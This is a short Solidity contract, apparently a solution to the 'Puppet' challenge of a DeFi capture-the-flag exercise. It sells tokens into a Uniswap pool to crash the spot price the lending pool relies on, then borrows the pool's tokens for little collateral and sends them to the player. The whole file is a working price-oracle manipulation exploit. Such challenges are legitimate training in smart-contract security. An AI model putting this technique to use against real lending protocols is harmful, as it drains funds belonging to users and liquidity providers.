// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

contract AttackPuppet {
    PuppetPool private puppet;
    address private uniswap;

    constructor(address _puppet, address _uniswap) {
        puppet = PuppetPool(_puppet);
        uniswap = _uniswap;
    }

    function attack(address player, uint256 tokenAmount) external payable {
        DamnValuableToken token = puppet.token();
        token.approve(uniswap, tokenAmount);

        (bool s, ) = uniswap.call(
            abi.encodeWithSignature(
                "tokenToEthTransferInput(uint256,uint256,uint256,address)",
                tokenAmount,
                1,
                block.timestamp + 10000,
                address(this)
            )
        );
        require(s);

        puppet.borrow{value: msg.value}(100000 ether, player);
        token.transfer(player, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
